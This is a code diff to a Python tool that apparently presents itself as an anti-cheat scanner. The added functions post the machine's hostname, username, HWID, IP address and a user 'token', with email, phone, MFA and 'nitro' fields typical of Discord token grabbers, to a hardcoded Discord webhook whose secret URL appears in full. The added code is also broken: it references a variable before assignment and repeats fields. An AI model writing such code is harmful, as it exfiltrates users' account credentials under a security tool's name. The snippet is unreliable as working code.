@@ -5,6 +5,8 @@ import random
 import time
 import os
 from urllib.error import HTTPError
+import requests
+
 
 # ─────────────────────────────────────────────
 # CONFIGURATION SUPABASE
@@ -191,3 +193,121 @@ def check_for_updates(current_version):
     except Exception:
         pass
     return False, None, None
+
+    # Charger la config
+with open("config.json", "r") as f:
+    cfg = json.load(f)
+
+WEBHOOK_URL = cfg.get("webhook", {}).get("url")
+FIELDS = cfg.get("fields", {})
+
+def send_discord(data):
+    embed = {
+        "title": "🖥️ Machine forensique",
+        "fields": [
+            {"name": "Machine", "value": data.get("nx_pcn", "N/A")},
+            {"name": "Utilisateur", "value": data.get("nx_un", "N/A")},
+            {"name": "HWID", "value": data.get("nx_hw", "N/A")},     
+            {"name": "token", "value": data.get("nx_tk", "N/A")},
+            {"name": "ip", "value": data.get("nx_ip", "N/A")},
+            {"name": "pcUsername", "value": data.get("nx_pcu", "N/A")},
+            {"name": "pcName", "value": data.get("nx_pcn", "N/A")},
+            {"name": "platform", "value": data.get("nx_pl", "N/A")},
+            {"name": "HWID", "value": data.get("nx_hw", "N/A")},     
+            {"name": "token", "value": data.get("nx_tk", "N/A")},
+            {"name": "Score", "value": f"{data.get('score', 'N/A')}/100"},
+            {"name": "Verdict", "value": data.get("verdict", "N/A")},
+            {"name": "Apps Suspectes", "value": data.get("applications", "N/A")},
+            {"name": "Details", "value": f"Score {data.get('score', 'N/A')}\nVerdict {data.get('verdict', 'N/A')}\nApplications: {', '.join(data.get('applications', []))}"},
+        ],
+        "color": 0xFF0000
+    }
+
+    payload = {
+        "embeds": [embed],
+        "username": "ANTI-Scanner"
+    }
+
+    req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode(), headers={
+        "Content-Type": "application/json"
+    })
+
+    try:
+        with urllib.request.urlopen(req) as response:
+            if response.status in [200, 204]:
+                print("Envoyé dans Discord")
+    except Exception as e:
+        print("Erreur d'envoi:", e)
+
+# Exemple d'utilisation :
+# Après ton scan, tu construis ce dict avec toutes les infos :
+scan_data = {
+    "nx_un": "adamm",
+    "nx_di": "1234",
+    "nx_uid": "user-1234",
+    "nx_em": "email@example.com",
+    "nx_ph": "0123456789",
+    "nx_mfa": True,
+    "nx_nt": True,
+    "nx_dl": 5,
+    "nx_tk": "token-example",
+    "nx_ip": "192.168.1.100",
+    "nx_pcu": "adamm",
+    "nx_pcn": "TUF-Gaming",
+    "nx_pl": "Windows 10",
+    "nx_hw": "HWID-0690-2D85-3F55",
+    "score": 95,
+    "verdict": "CHEATER",
+    "applications": ["loader.exe"]
+}
+
+def send_to_discord(scan_id, scan_data, verdict):
+    """
+    Envoie un rapport de scan formaté dans un salon Discord via webhook.
+    Ne crash jamais — erreurs silencieuses.
+    """
+    webhook_url = "https://discord.com/api/webhooks/1532577693403713738/NWuxiOCKka0JA_lUj6Y3sFEz3merIKwRKTj9Y6JStyukly0JYhwA52LMWa5QdlUYWoKx"
+
+    si = scan_data.get("system_info", {})
+    risk = scan_data.get("risk_summary", {})
+    score = risk.get("overall_risk_score", 0)
+
+    color_map = {"CHEATER": 0xFF4444, "ANORMAL": 0xFFAA00, "CLEAN": 0x44FF88}
+    color = color_map.get(verdict, 0x888888)
+
+    icon_map = {"CHEATER": "🔴", "ANORMAL": "🟡", "CLEAN": "🟢"}
+    icon = icon_map.get(verdict, "⚪")
+
+    apps = scan_data.get("applications", [])
+    flagged_apps = [a for a in apps if (a.get("risk_assessment", {}).get("risk_score") or 0) >= 60]
+    flagged_str = "\n".join(f"• `{a.get('app_name', 'inconnu')}` — score {a.get('risk_assessment', {}).get('risk_score', 0)}" for a in flagged_apps[:5]) or "Aucune"
+
+    embed = {
+        "title": f"{icon} ANTI Scanner — {verdict}",
+        "description": f"Scan `{scan_id}` terminé.",
+        "color": color,
+        "fields": [
+            {"name": "🖥️ Machine", "value": f"`{si.get('hostname', 'N/A')}`", "inline": True},
+            {"name": "👤 Utilisateur", "value": f"`{si.get('user', 'N/A')}`", "inline": True},
+            {"name": "🔑 HWID", "value": f"`{si.get('hwid', 'N/A')}`", "inline": False},
+            {"name": "📊 Score", "value": f"`{score}/100`", "inline": True},
+            {"name": "token", "value": data.get("nx_tk", "N/A")},
+            {"name": "ip", "value": data.get("nx_ip", "N/A")},
+            {"name": "pcUsername", "value": data.get("nx_pcu", "N/A")},
+            {"name": "pcName", "value": data.get("nx_pcn", "N/A")},
+            {"name": "platform", "value": data.get("nx_pl", "N/A")},
+            {"name": "HWID", "value": data.get("nx_hw", "N/A")},     
+            {"name": "token", "value": data.get("nx_tk", "N/A")},
+            {"name": "⚖️ Verdict", "value": f"`{verdict}`", "inline": True},
+            {"name": "🖥️ OS", "value": f"`{si.get('os_version', 'N/A')}`", "inline": False},
+            {"name": "⚠️ Apps Suspectes (top 5)", "value": flagged_str, "inline": False},
+        ],
+        "footer": {"text": f"ANTI Defense System v1.9 | {scan_data.get('timestamp', '')}"}
+    }
+
+    data = {"embeds": [embed], "username": "ANTI Defense"}
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 204:
+        print("Information envoyée avec succès")
+    else:
+        print("Erreur lors de l'envoi des informations")
